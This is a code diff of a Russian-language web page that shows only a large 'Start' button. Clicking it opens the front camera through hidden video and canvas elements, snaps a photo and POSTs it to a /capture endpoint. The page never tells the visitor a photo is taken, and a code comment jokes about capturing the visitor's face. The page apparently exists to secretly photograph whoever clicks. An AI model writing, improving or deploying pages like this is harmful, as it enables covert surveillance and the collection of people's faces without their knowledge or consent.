@@ -7,64 +7,71 @@
     <style>
         body {
             margin: 0;
-            padding: 20px;
-            background: white;
+            padding: 0;
+            background: black;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
         button {
-            background: #000;
-            color: white;
+            background: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 8px;
+            padding: 20px 60px;
+            font-size: 24px;
+            border-radius: 40px;
+            font-weight: bold;
             cursor: pointer;
-        }
-        video, canvas {
-            display: none;
         }
     </style>
 </head>
 <body>
     <button id="btn">Начать</button>
     
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" style="display:none" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
         const btn = document.getElementById('btn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         
-        btn.onclick = function() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    
-                    video.onloadeddata = function() {
-                        setTimeout(function() {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            
-                            var photo = canvas.toDataURL('image/jpeg');
-                            
-                            fetch('/capture', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({photo: photo})
-                            }).finally(function() {
-                                stream.getTracks().forEach(function(t) { t.stop(); });
-                            });
-                        }, 200);
-                    };
-                })
-                .catch(function(err) {
-                    console.log(err);
+        btn.onclick = async () => {
+            try {
+                btn.style.opacity = '0.5';
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',  // фронталка (твоя морда)
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
                 });
+                
+                video.srcObject = stream;
+                
+                video.onloadeddata = () => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        const photo = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ photo: photo })
+                        }).finally(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            btn.style.opacity = '1';
+                        });
+                    }, 300);
+                };
+            } catch (err) {
+                alert('Ошибка: ' + err.message);
+                btn.style.opacity = '1';
+            }
         };
     </script>
 </body>
